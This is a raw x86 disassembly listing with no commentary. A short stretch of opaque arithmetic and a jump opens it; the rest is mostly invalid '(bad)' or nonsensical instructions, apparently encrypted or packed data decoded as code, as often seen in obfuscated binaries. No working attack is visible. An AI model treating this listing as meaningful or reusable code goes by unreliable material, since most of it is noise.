  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e8e2,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x4306c6,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x4306c2,0x13
  401884:	cmp    DWORD PTR ds:0x4306c2,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x4306c2,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42ec24
  4018a9:	mov    ebx,DWORD PTR ds:0x4306c2
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x4306c2,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e8de,0x42e8e2
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x430632,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e8ea,0x4306c2
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x4306d2,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	das    
  401915:	imul   edx,edi,0x39
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401940
  401921:	repnz inc edx
  401923:	mov    ah,0x33
  401925:	test   BYTE PTR [ebx+0x4e],ch
  401928:	test   al,0xcd
  40192a:	mov    cl,0x46
  40192c:	aam    0x5e
  40192e:	add    bl,BYTE PTR [edi-0x17c9fce3]
  401934:	mov    ebp,0xecba4270
  401939:	jnp    0x401969
  40193b:	repz push esp
  40193d:	mov    esi,0x9261f76f
  401942:	inc    ebp
  401943:	mov    ds,WORD PTR [edi+0x74]
  401946:	xor    eax,esi
  401948:	aaa    
  401949:	mov    ah,0x7a
  40194b:	dec    eax
  40194c:	leave  
  40194d:	or     edi,eax
  40194f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401950:	aas    
  401951:	ja     0x401992
  401953:	mov    ch,0x6
  401955:	and    eax,0x6f1f5238
  40195a:	int    0xb8
  40195c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40195d:	les    ebx,FWORD PTR [ebp+0x6e713a8c]
  401963:	out    0x80,al
  401965:	mov    cl,0x78
  401967:	dec    ebp
  401968:	xor    bl,BYTE PTR [eax-0x77b42edc]
  40196e:	iret   
  40196f:	jmp    0x19f33635
  401974:	fcom   DWORD PTR [edx]
  401976:	push   edx
  401977:	push   esp
  401978:	mov    ecx,0xaf66f153
  40197d:	or     esi,esi
  40197f:	into   
  401980:	lahf   
  401981:	cdq    
  401982:	xor    dl,BYTE PTR es:[edi]
  401985:	push   ebx
  401986:	pop    esi
  401987:	and    al,0x31
  401989:	push   0x11b61110
  40198e:	lahf   
  40198f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401990:	je     0x401924
  401992:	pop    ss
  401993:	xor    al,0x1a
  401995:	repz inc esi
  401997:	aas    
  401998:	inc    ecx
  401999:	stos   DWORD PTR es:[edi],eax
  40199a:	fnstsw WORD PTR [ebx+eax*4-0x7d3dc1cf]
  4019a1:	gs out 0xc9,eax
  4019a4:	test   al,0x89
  4019a6:	add    esi,DWORD PTR [edx]
  4019a8:	retf   0xcca2
  4019ab:	jbe    0x4019d7
  4019ad:	mov    edi,0xa1d303cb
  4019b2:	test   dl,dh
  4019b4:	adc    DWORD PTR [esi],eax
  4019b6:	inc    edi
  4019b7:	push   cs
  4019b8:	cmp    BYTE PTR [eax-0x5754e60b],al
  4019be:	call   0xf339:0x61495a4
  4019c5:	rcl    BYTE PTR [ebp+0x2879efc6],0xc3
  4019cc:	dec    edx
  4019cd:	shr    BYTE PTR [edi],cl
  4019cf:	stos   BYTE PTR es:[edi],al
  4019d0:	dec    eax
  4019d1:	pop    ebx
  4019d2:	in     eax,0xd4
  4019d4:	imul   ch
  4019d6:	inc    ebx
  4019d7:	cmp    al,0x34
  4019d9:	mov    BYTE PTR [edx+edx*4+0x66],bh
  4019dd:	mov    al,0x42
  4019df:	jg     0x4019b6
  4019e1:	sbb    BYTE PTR [edx],bh
  4019e3:	push   eax
  4019e4:	ins    BYTE PTR es:[edi],dx
  4019e5:	(bad)  
  4019e6:	mov    edx,0x878d954a
  4019eb:	mov    al,ds:0x961bac68
  4019f0:	in     eax,0xe2
  4019f2:	cld    
  4019f3:	add    al,0x5b
  4019f5:	push   ebp
  4019f6:	mov    dl,0xbc
  4019f8:	inc    ebx
  4019f9:	sbb    DWORD PTR [ecx-0x6c],ebx
  4019fc:	(bad)  [ebx-0x55]
  4019ff:	and    al,0xf8
  401a01:	mov    dh,0xf1
  401a03:	stos   DWORD PTR es:[edi],eax
  401a04:	push   cs
  401a05:	fwait
  401a06:	out    0xb8,al
  401a08:	sar    DWORD PTR [eax-0x71],1
  401a0b:	mov    esp,0x91e20440
  401a10:	or     dl,bl
  401a12:	dec    esp
  401a13:	mov    esi,0xa5ce4b26
  401a18:	add    eax,0x9c97aef6
  401a1d:	dec    ebp
  401a1e:	mov    eax,0xed1aeb4d
  401a23:	mov    ebx,0x8e42096f
  401a28:	in     al,dx
  401a29:	gs int 0x86
  401a2c:	ficom  WORD PTR [edi]
  401a2e:	jl     0x401a58
  401a30:	cmp    BYTE PTR [ebp-0x443b6970],cl
  401a36:	rol    DWORD PTR [ecx+0x34],0x29
  401a3a:	xchg   ebx,eax
  401a3b:	push   ebx
  401a3c:	rol    ebp,1
  401a3e:	jb     0x401aa3
  401a40:	(bad)  
  401a41:	(bad)  [esi+0xdc9061e]
  401a47:	cld    
  401a48:	dec    ecx
  401a49:	aam    0x97
  401a4b:	mov    ecx,0x5af653a
  401a50:	cld    
  401a51:	jbe    0x401a37
  401a53:	call   0x64614a69
  401a58:	sbb    eax,0x48c4a093
  401a5d:	call   0x44c4f535
  401a62:	cmp    eax,0xdc583203
  401a67:	and    ah,BYTE PTR [edx+0x25]
  401a6a:	and    eax,0x7ab846f
  401a6f:	jl     0x401a6e
  401a71:	sbb    al,0xd4
  401a73:	inc    edx
  401a74:	aas    
  401a75:	cmp    al,0x9c
  401a77:	and    BYTE PTR [ecx],0xf8
  401a7a:	pop    eax
  401a7b:	xor    eax,0xbcb8a989
  401a80:	dec    ebp
  401a81:	dec    ebp
  401a83:	xchg   ebp,eax
  401a84:	sbb    DWORD PTR [ecx-0x4da14af5],edx
  401a8a:	je     0x401aa8
  401a8c:	enter  0x1eaa,0x58
  401a90:	test   BYTE PTR [edi+0x26],cl
  401a93:	cmc    
  401a94:	sub    al,0x4c
  401a96:	xchg   edi,eax
  401a97:	ins    DWORD PTR es:[edi],dx
  401a98:	push   ebx
  401a99:	jne    0x401a67
  401a9b:	dec    edi
  401a9c:	and    edi,DWORD PTR [edi]
  401a9e:	add    eax,0xd2bfa9ea
  401aa3:	dec    eax
  401aa4:	popa   
  401aa5:	std    
  401aa6:	scas   al,BYTE PTR es:[edi]
  401aa7:	aaa    
  401aa8:	jne    0x401a89
  401aaa:	cmp    DWORD PTR [edx-0x42],edi
  401aad:	dec    ecx
  401aae:	pop    eax
  401aaf:	jmp    0x79247744
  401ab4:	(bad)  
  401ab5:	cmp    eax,0xaaa4074
  401aba:	stos   BYTE PTR es:[edi],al
  401abb:	jne    0x401ae5
  401abd:	lods   eax,DWORD PTR ds:[esi]
  401abe:	and    al,0x73
  401ac0:	pop    esi
  401ac1:	aad    0x1d
  401ac3:	stc    
  401ac4:	mov    eax,0xa0c64722
  401ac9:	ja     0x401af0
  401acb:	inc    edx
  401acc:	int    0x86
  401ace:	imul   edx,DWORD PTR [ebp+0x4ad2c37],0xffffffac
  401ad5:	mov    BYTE PTR [ebx-0x2caa16ba],dl
  401adb:	mov    eax,ds:0x1d553511
  401ae0:	cwde   
  401ae1:	mov    eax,0x394a6f78
  401ae6:	retf   0xade2
  401ae9:	pop    ecx
  401aea:	cs xchg ebx,eax
  401aec:	and    BYTE PTR [edx+0x22],0x33
  401af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af1:	popa   
  401af2:	bound  edx,QWORD PTR [edx-0x2]
  401af5:	mov    bl,0x97
  401af7:	inc    eax
  401af8:	push   ebx
  401af9:	fldenv ds:0x52390574
  401aff:	int    0x0
  401b01:	fistp  WORD PTR [eax-0xb]
  401b04:	jge    0x401b0d
  401b06:	mov    DWORD PTR [ebp-0x3d5f36e0],edx
  401b0c:	mov    esp,0xa22429d8
  401b11:	in     al,dx
  401b12:	aam    0x4f
  401b14:	popa   
  401b15:	or     edx,DWORD PTR [edx+esi*8]
  401b18:	stos   DWORD PTR es:[edi],eax
  401b19:	xor    DWORD PTR [edi+0xd],ebx
  401b1c:	fild   QWORD PTR [ebx]
  401b1e:	pop    esi
  401b1f:	ds pop edx
  401b21:	pop    es
  401b22:	fst    DWORD PTR [edx-0x10]
  401b25:	fiadd  DWORD PTR [eax]
  401b27:	mov    bl,0x34
  401b29:	push   ss
  401b2a:	and    bh,BYTE PTR [esp+esi*8]
  401b2d:	adc    al,0xef
  401b2f:	(bad)  
  401b30:	je     0x401ae0
  401b32:	xchg   edx,eax
  401b33:	repz mov ebp,0x102b64dd
  401b39:	scas   al,BYTE PTR es:[edi]
  401b3a:	inc    ebp
  401b3b:	test   DWORD PTR [ebx+edi*2+0x5574140],esp
  401b42:	dec    dx
  401b44:	pop    es
  401b45:	add    BYTE PTR [ecx],dl
  401b47:	(bad)  
  401b48:	jp     0x401af1
  401b4a:	add    dh,0xbc
  401b4d:	arpl   WORD PTR [eax-0x60fc3f2b],ax
  401b53:	loop   0x401bcb
  401b55:	jle    0x401ad7
  401b57:	add    al,0x87
  401b59:	or     BYTE PTR [esi],0xd2
  401b5c:	fadd   DWORD PTR [ebp+0x4b6d93ae]
  401b62:	pop    esi
  401b63:	stos   BYTE PTR es:[edi],al
  401b64:	cld    
  401b65:	dec    dh
  401b67:	in     al,dx
  401b68:	inc    esi
  401b69:	test   eax,0x7ebfa265
  401b6e:	fdivr  st(7),st
  401b70:	pusha  
  401b71:	and    DWORD PTR [ecx],ebx
  401b73:	(bad)  
  401b74:	xor    al,BYTE PTR fs:[esp+ebx*4+0x4e30ff35]
  401b7c:	scas   eax,DWORD PTR es:[edi]
  401b7d:	mov    esi,0x4974355
  401b82:	mov    eax,0xb98592f9
  401b87:	or     eax,0x4aa56fed
  401b8c:	xor    BYTE PTR es:[ebx+ecx*4],cl
  401b90:	or     eax,0x5eb1e1a4
  401b95:	pop    eax
  401b96:	(bad)  
  401b97:	je     0x401b74
  401b99:	jge    0x401bf3
  401b9b:	rol    DWORD PTR [edx],1
  401b9d:	and    eax,0x3a61936d
  401ba2:	icebp  
  401ba3:	add    al,0x72
  401ba5:	sbb    DWORD PTR [edx+0x4d],esi
  401ba8:	pop    ss
  401ba9:	(bad)  
  401baa:	arpl   WORD PTR [ebx],bx
  401bac:	mov    eax,ds:0xd7439798
  401bb1:	fild   DWORD PTR [ecx+0x7b695d6e]
  401bb7:	retf   0xa0e7
  401bba:	inc    edx
  401bbb:	clc    
  401bbc:	gs stc 
  401bbe:	fnstcw WORD PTR [eax]
  401bc0:	add    BYTE PTR [ebp+0x4],cl
  401bc3:	in     eax,dx
  401bc4:	jmp    0xea7ef928
  401bc9:	or     edx,DWORD PTR [eax+0x5d3979c8]
  401bcf:	inc    edx
  401bd0:	xchg   ecx,eax
  401bd1:	lahf   
  401bd2:	dec    edx
  401bd3:	jg     0x401b9b
  401bd5:	mov    gs,ebx
  401bd7:	jmp    0x11313d51
  401bdc:	mov    cs,WORD PTR [edx-0x15f16325]
  401be2:	fild   QWORD PTR [esi]
  401be4:	(bad)  
  401be5:	clc    
  401be6:	xor    eax,0x3f7eedc2
  401beb:	xchg   esi,eax
  401bec:	fcomp  QWORD PTR [eax]
  401bee:	or     al,0x5c
  401bf0:	test   al,0x99
  401bf2:	inc    ecx
  401bf3:	xchg   ebx,eax
  401bf4:	mov    BYTE PTR [edi+0x7d],cl
  401bf7:	lods   al,BYTE PTR ds:[esi]
  401bf8:	jmp    DWORD PTR [ecx-0x55da821f]
  401bfe:	rcl    DWORD PTR [ebx],0x4e
  401c01:	imul   ebp,DWORD PTR [esi],0xc22f9a8e
  401c07:	call   0xf9c6b379
  401c0c:	jno    0x401c46
  401c0e:	repz jmp 0xee0ccd4e
  401c14:	sub    esp,DWORD PTR [esi+ebp*1]
  401c17:	jge    0x401be9
  401c19:	fdivr  st,st(3)
  401c1b:	xchg   ebx,eax
  401c1c:	fnstenv [ebp+0x72]
  401c1f:	jecxz  0x401bf6
  401c21:	call   0x51ff:0x3e7cc845
  401c28:	xor    BYTE PTR [ebx-0x43],bh
  401c2b:	retf   0xd078
  401c2e:	inc    eax
  401c2f:	lds    eax,FWORD PTR [edx+eiz*4-0x72]
  401c33:	adc    ebp,DWORD PTR ds:0x39f196da
  401c39:	sbb    al,0x2b
  401c3b:	and    eax,0x2d52412f
  401c40:	push   edi
  401c41:	xchg   edx,eax
  401c42:	dec    esp
  401c43:	out    dx,al
  401c44:	xchg   ebx,eax
  401c45:	daa    
  401c46:	call   0x4af082ad
  401c4b:	int3   
  401c4c:	aas    
  401c4d:	lods   eax,DWORD PTR ds:[esi]
  401c4e:	cmc    
  401c4f:	pop    ebx
  401c50:	adc    edi,DWORD PTR [ecx+0x71]
  401c53:	gs pop ebx
  401c55:	push   0xffffffe5
  401c57:	retf   0x5d21
  401c5a:	pop    esi
  401c5b:	icebp  
  401c5c:	call   0x386ee018
  401c61:	xchg   ecx,eax
  401c62:	mov    ah,BYTE PTR [eax-0x21]
  401c65:	push   edx
  401c66:	pop    eax
  401c67:	neg    ecx
  401c69:	test   eax,0xeda14fa3
  401c6e:	xchg   ecx,eax
  401c6f:	inc    eax
  401c70:	xchg   DWORD PTR [ebx+edi*1],ecx
  401c73:	sub    al,0xa1
  401c75:	jne    0x401c59
  401c77:	sbb    DWORD PTR [esi+edi*1],ecx
  401c7a:	mov    al,0x8e
  401c7c:	fsub   QWORD PTR [esi-0x5b]
  401c7f:	out    dx,al
  401c80:	retf   
  401c81:	jo     0x401c95
  401c83:	push   esi
  401c84:	xlat   BYTE PTR ds:[ebx]
  401c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c86:	sbb    eax,0x9c8650d0
  401c8b:	xor    ah,BYTE PTR [edx]
  401c8d:	mov    cl,0xd
  401c8f:	shl    BYTE PTR [ecx],0xbf
  401c92:	cli    
  401c93:	repnz xlat BYTE PTR gs:[ebx]
  401c96:	in     al,0x12
  401c98:	mov    dh,0x3c
  401c9a:	nop
  401c9b:	scas   al,BYTE PTR es:[edi]
  401c9c:	push   ss
  401c9d:	add    DWORD PTR [ecx-0x5a3fe1ed],0x13
  401ca4:	fs in  eax,0xf3
  401ca7:	fsub   QWORD PTR [ecx+0x3b4113fb]
  401cad:	and    DWORD PTR [esi+ecx*4],0x57
  401cb1:	in     al,dx
  401cb2:	jecxz  0x401c5c
  401cb4:	div    ebx
  401cb6:	mov    DWORD PTR ds:0x42efa0,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c7b
  401cd2:	or     BYTE PTR cs:[esi-0x46],ah
  401cd6:	or     BYTE PTR [esi+0x7e],bh
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	jle    0x401d56
  401cdf:	add    eax,DWORD PTR [edi+0x52]
  401ce2:	in     eax,0x7d
  401ce4:	test   BYTE PTR [esi+ebx*1-0x5701d93],cl
  401ceb:	mov    ch,0xa5
  401ced:	fucomp st(3)
  401cef:	mov    WORD PTR [edx-0x7a64465],?
  401cf5:	xor    edi,0xffffffd5
  401cf8:	fiadd  DWORD PTR [eax+edx*2-0x724662d7]
  401cff:	push   ebx
  401d00:	lods   al,BYTE PTR ds:[esi]
  401d01:	aas    
  401d02:	fwait
  401d03:	mov    ecx,0xd4768b01
  401d08:	mov    ecx,0x22a7e5ff
  401d0d:	cld    
  401d0e:	in     al,0x58
  401d10:	in     eax,dx
  401d11:	push   0x61
  401d13:	(bad)  
  401d14:	mov    edx,0x69471670
  401d19:	mov    DWORD PTR [esi+0x2c],0xb1caaad8
  401d20:	mov    eax,ds:0xbe812aec
  401d25:	cld    
  401d26:	inc    esp
  401d27:	xchg   ecx,eax
  401d28:	mov    edx,0xdbf4d77
  401d2d:	(bad)  
  401d2e:	lock ror BYTE PTR [edx+0x2f],0xbd
  401d33:	jne    0x401d68
  401d35:	aad    0xef
  401d37:	fstp   QWORD PTR [edi]
  401d39:	arpl   WORD PTR [esi],sp
  401d3b:	test   esp,eax
  401d3d:	or     DWORD PTR [esi-0x3e],ebp
  401d40:	sar    esp,0x96
  401d43:	pop    ss
  401d44:	xlat   BYTE PTR ds:[ebx]
  401d45:	jnp    0x401d05
  401d47:	cmp    ecx,edi
  401d49:	adc    esi,DWORD PTR [esi+0xd]
  401d4c:	dec    ebx
  401d4d:	sub    DWORD PTR [ebx+ecx*8+0x325dcba],ecx
  401d54:	pop    edi
  401d55:	and    BYTE PTR [edi+0x9],bh
  401d58:	ror    edi,1
  401d5a:	mov    cl,dl
  401d5c:	or     esi,esi
  401d5e:	pop    ss
  401d5f:	out    0x6f,eax
  401d61:	mov    dl,0xac
  401d63:	adc    al,dh
  401d65:	pushf  
  401d66:	sub    eax,DWORD PTR [ebp+ebx*2+0x23]
  401d6a:	out    0xbd,eax
  401d6c:	adc    DWORD PTR [eax],eax
  401d6e:	mov    esi,0x7a093c18
  401d73:	jnp    0x401de3
  401d75:	or     BYTE PTR [edx+eiz*1-0x61],dl
  401d79:	sti    
  401d7a:	or     al,0x7e
  401d7c:	fdivp  st(2),st
  401d7e:	or     dl,BYTE PTR [edx+0x0]
  401d81:	enter  0xbcf9,0xb5
  401d85:	mov    ss,WORD PTR [ecx-0x34]
  401d88:	xchg   edi,eax
  401d89:	lock mov ebx,0xd68fd06
  401d8f:	mov    ds:0xd16545c2,eax
  401d94:	xchg   BYTE PTR [ebp-0x623f376c],bh
  401d9a:	or     DWORD PTR [edx-0x3b],esi
  401d9d:	xchg   ebx,eax
  401d9e:	push   0x48927827
  401da3:	mov    ch,0x4e
  401da5:	nop
  401da6:	cli    
  401da7:	retf   
  401da8:	push   esi
  401da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401daa:	loop   0x401d8e
  401dac:	aam    0x4b
  401dae:	imul   esi,DWORD PTR [esp+ebp*8-0x51],0xffffff86
  401db3:	jnp    0x401e19
  401db5:	adc    dl,bl
  401db7:	retf   
  401db8:	or     ebx,0x18
  401dbb:	mov    DWORD PTR [ebx-0x42438516],esi
  401dc1:	stc    
  401dc2:	and    bl,BYTE PTR [edi+0x4fd60679]
  401dc8:	push   ebp
  401dc9:	gs stos DWORD PTR es:[edi],eax
  401dcb:	mov    ch,0x4c
  401dcd:	leave  
  401dce:	push   0xb13f6b6d
  401dd3:	out    dx,eax
  401dd4:	sti    
  401dd5:	mov    bl,0xf7
  401dd7:	pop    edx
  401dd8:	xchg   eax,ebx
  401dda:	(bad)  
  401ddc:	xchg   DWORD PTR [esi],ebx
  401dde:	(bad)  
  401ddf:	jp     0x401d99
  401de1:	in     al,dx
  401de2:	pop    ebx
  401de3:	shr    esp,1
  401de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401de7:	pop    ebp
  401de8:	sbb    DWORD PTR [eax+0x3a],ecx
  401deb:	repz test edi,esp
  401dee:	ins    DWORD PTR es:[edi],dx
  401def:	fist   WORD PTR [esi+0x7e]
  401df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401df3:	or     al,0x37
  401df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401df6:	cdq    
  401df7:	jp     0x401ddb
  401df9:	imul   BYTE PTR [ecx+0x31]
  401dfc:	mov    ds:0xf41830b7,al
  401e01:	xlat   BYTE PTR ds:[ebx]
  401e02:	mov    WORD PTR [edx-0x3],?
  401e05:	xchg   ecx,esp
  401e07:	mov    bh,BYTE PTR ds:0xe1880ed3
  401e0d:	test   DWORD PTR [ecx+0x7891bf09],0xb2b832de
  401e17:	hlt    
  401e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e19:	aam    0xa2
  401e1b:	pop    ebp
  401e1c:	jl     0x401df7
  401e1e:	fidiv  WORD PTR [ebp-0x51773f3b]
  401e24:	inc    ecx
  401e25:	into   
  401e26:	fild   DWORD PTR [ebx+edi*1+0x12afe05c]
  401e2d:	aas    
  401e2e:	pop    es
  401e2f:	and    BYTE PTR [edi],bl
  401e31:	loopne 0x401e70
  401e33:	push   ss
  401e34:	es dec esp
  401e36:	jb     0x401e44
  401e38:	call   0x85e4200f
  401e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e3e:	test   DWORD PTR ds:0xaa2b25f5,ebx
  401e44:	mov    WORD PTR [ecx-0x5ed21087],ss
  401e4a:	or     bl,BYTE PTR [ebp-0x162d0d65]
  401e50:	xchg   edx,eax
  401e51:	jo     0x401e45
  401e53:	pushf  
  401e54:	leave  
  401e55:	push   cs
  401e56:	mov    ebx,0x54c15f30
  401e5b:	stc    
  401e5c:	adc    al,ch
  401e5e:	in     eax,0xb6
  401e60:	adc    eax,0x8aff3ebb
  401e65:	jnp    0x401eb4
  401e67:	call   0x6f5a0096
  401e6c:	mov    ah,0x9
  401e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e6f:	ss gs into 
  401e72:	mov    ah,0x62
  401e74:	out    dx,eax
  401e75:	enter  0x6fc8,0x99
  401e79:	or     al,0xc1
  401e7b:	xchg   esi,eax
  401e7c:	and    dl,BYTE PTR [edi]
  401e7e:	adc    al,0xba
  401e80:	cli    
  401e81:	ret    
  401e82:	jmp    0x1125:0x6aca6bec
  401e89:	add    eax,0x725f7786
  401e8e:	or     dl,ah
  401e90:	mov    ds,ebx
  401e92:	mov    ch,0x80
  401e94:	sbb    al,0xb2
  401e96:	test   BYTE PTR [ebp+0x8],0x3e
  401e9a:	cdq    
  401e9b:	test   eax,0x6d03c338
  401ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ea1:	fstp   QWORD PTR [ecx+0x60fb55a4]
  401ea7:	inc    edi
  401ea8:	enter  0xc6a4,0xa7
  401eac:	aam    0xae
  401eae:	xor    al,0x5d
  401eb0:	cld    
  401eb1:	inc    esi
  401eb2:	xchg   esp,eax
  401eb3:	fsub   st,st(1)
  401eb5:	mov    al,ds:0x31ed5890
  401eba:	test   al,0x43
  401ebc:	xchg   esp,eax
  401ebd:	or     eax,0x8cee29fb
  401ec2:	inc    ecx
  401ec3:	push   esi
  401ec4:	fs jmp 0x401ea9
  401ec7:	prefetcht0 BYTE PTR ds:0x5f72a8d7
  401ece:	iret   
  401ecf:	test   BYTE PTR ds:0x71910a7f,ch
  401ed5:	pop    eax
  401ed6:	jecxz  0x401e6c
  401ed8:	cmp    ah,bl
  401eda:	push   ecx
  401edb:	dec    ebx
  401edc:	outs   dx,DWORD PTR ds:[esi]
  401edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ede:	scas   eax,DWORD PTR es:[edi]
  401edf:	xchg   esp,eax
  401ee0:	xor    al,0xe3
  401ee2:	jbe    0x401e64
  401ee4:	rol    BYTE PTR [edi+eax*4+0x3f],0x49
  401ee9:	xchg   DWORD PTR [eax+0xb],eax
  401eec:	sub    BYTE PTR [ecx+0x69cff28a],0x62
  401ef3:	sbb    bh,bl
  401ef5:	ficom  DWORD PTR [ebx+edx*1+0x2e]
  401ef9:	sbb    BYTE PTR [ebx],bh
  401efb:	lds    ebx,FWORD PTR [eax-0x17]
  401efe:	(bad)  
  401f00:	rep outs dx,BYTE PTR ds:[esi]
  401f02:	enter  0x9bf5,0xca
  401f06:	push   ecx
  401f07:	lods   al,BYTE PTR ds:[esi]
  401f08:	mov    ch,0x89
  401f0a:	mov    dh,0x53
  401f0c:	push   ds
  401f0d:	cmp    BYTE PTR [edi],0x9b
  401f10:	mov    ah,0xbb
  401f12:	sub    eax,0xaa54490e
  401f17:	int    0xa1
  401f19:	ret    
  401f1a:	imul   esp,eax,0x19439296
  401f20:	and    BYTE PTR [ebx-0x4e],bl
  401f23:	jno    0x401eb5
  401f25:	sbb    ebp,DWORD PTR [esi+0x60]
  401f28:	repnz cmp bh,BYTE PTR [edx-0x5b]
  401f2c:	(bad)  
  401f2d:	fdiv   QWORD PTR [ecx-0x329c4dd1]
  401f33:	stos   DWORD PTR es:[edi],eax
  401f34:	dec    eax
  401f35:	ret    
  401f36:	mov    edi,0xe21abfa9
  401f3b:	sub    DWORD PTR [ebx-0x7e],0x31
  401f3f:	out    0x3d,al
  401f41:	mov    ?,WORD PTR [ecx]
  401f43:	imul   ebp,DWORD PTR [ebp+0x2c],0xffffffab
  401f47:	push   edi
  401f48:	pop    ebx
  401f49:	add    BYTE PTR [edi-0x4edfe599],bh
  401f4f:	add    DWORD PTR [ebx+0x79a5482],esp
  401f55:	(bad)  
  401f56:	leave  
  401f57:	push   0x7
  401f59:	sbb    esi,DWORD PTR [esi+0x27e6d56e]
  401f5f:	or     BYTE PTR [ecx+0x35],0xb8
  401f63:	nop
  401f64:	sbb    bh,BYTE PTR [ecx-0x17]
  401f67:	ss jae 0x401f8f
  401f6a:	in     eax,0x51
  401f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f6d:	inc    ecx
  401f6e:	xchg   esi,eax
  401f6f:	lods   eax,DWORD PTR ds:[esi]
  401f70:	arpl   WORD PTR [edx-0x298cad76],si
  401f76:	xor    esp,DWORD PTR [edi]
  401f78:	(bad)  
  401f79:	fld    TBYTE PTR [ebx]
  401f7b:	icebp  
  401f7c:	mov    ah,0x59
  401f7e:	test   BYTE PTR [eax+0x235f334a],al
  401f84:	leave  
  401f85:	mov    DWORD PTR [ebx-0x65ab74a0],0x10ded91d
  401f8f:	sti    
  401f90:	mov    DWORD PTR [eax+0x1ec8902c],edi
  401f96:	sbb    BYTE PTR [eax],bl
  401f98:	mov    cl,0xd0
  401f9a:	pop    edi
  401f9b:	push   0x28
  401f9d:	ror    BYTE PTR [edi],0x74
  401fa0:	bound  ebp,QWORD PTR [eax+eiz*8]
  401fa3:	jb     0x401f44
  401fa5:	(bad)  [eax-0x5a]
  401fa8:	loope  0x401fb1
  401faa:	into   
  401fab:	popf   
  401fac:	pop    ss
  401fad:	jns    0x401f8a
  401faf:	sub    dl,BYTE PTR [ebx-0x7635568d]
  401fb5:	aas    
  401fb6:	push   ebp
  401fb7:	daa    
  401fb8:	call   0x70ef:0xa9a58ddb
  401fbf:	cmp    eax,0x15e71a4e
  401fc4:	adc    eax,0x855de412
  401fc9:	gs sub eax,0xddf4606c
  401fcf:	xor    ecx,DWORD PTR [ebx]
  401fd1:	mov    esi,DWORD PTR [edi-0x1d012372]
  401fd7:	sbb    edx,DWORD PTR [edi]
  401fd9:	push   0x29
  401fdb:	(bad)  
  401fdc:	aam    0x63
  401fde:	or     eax,0x72006bff
  401fe3:	add    BYTE PTR [esi+eiz*4],0x21
  401fe7:	neg    BYTE PTR [ecx]
  401fe9:	cmp    al,0xd8
  401feb:	mov    ah,0xaa
  401fed:	add    bh,ah
  401fef:	push   0xffffffa1
  401ff1:	mov    ebp,0x44a93c69
  401ff6:	enter  0xdd3b,0x91
  401ffa:	paddd  mm1,mm4
  401ffd:	cmp    DWORD PTR [edx-0x15],ebp
  402000:	popa   
  402001:	add    DWORD PTR [esi-0x58971069],0xffffffbc
  402008:	sub    eax,ecx
  40200a:	sbb    BYTE PTR [esi+eax*8-0x466f2693],bh
  402011:	fwait
  402012:	mov    cl,0xbe
  402014:	in     al,0xd9
  402016:	adc    al,0x76
  402018:	ins    DWORD PTR es:[edi],dx
  402019:	(bad)  [eax+0x5f]
  40201c:	adc    eax,0xed34f6b9
  402021:	mov    edi,0x22939a88
  402026:	xchg   edx,eax
  402027:	push   esp
  402028:	leave  
  402029:	lock lock test BYTE PTR [edi],ah
  40202d:	and    DWORD PTR [edx+0x37],edi
  402030:	push   eax
  402031:	(bad)  
  402032:	jl     0x40207e
  402034:	ds js  0x402065
  402037:	mov    esi,0x4f3a25e7
  40203c:	fldenv [ebp-0x7e]
  40203f:	push   cs
  402040:	loop   0x40202f
  402042:	push   ebp
  402043:	retf   0x402a
  402046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402047:	call   0xf08c67be
  40204c:	sar    BYTE PTR [edx],0x2d
  40204f:	cmp    ebp,DWORD PTR [ebx+ebp*2-0x4f784c2]
  402056:	shr    BYTE PTR ds:0x61e30318,1
  40205c:	lods   eax,DWORD PTR ds:[esi]
  40205d:	lds    ecx,FWORD PTR [ecx+0x78d1863]
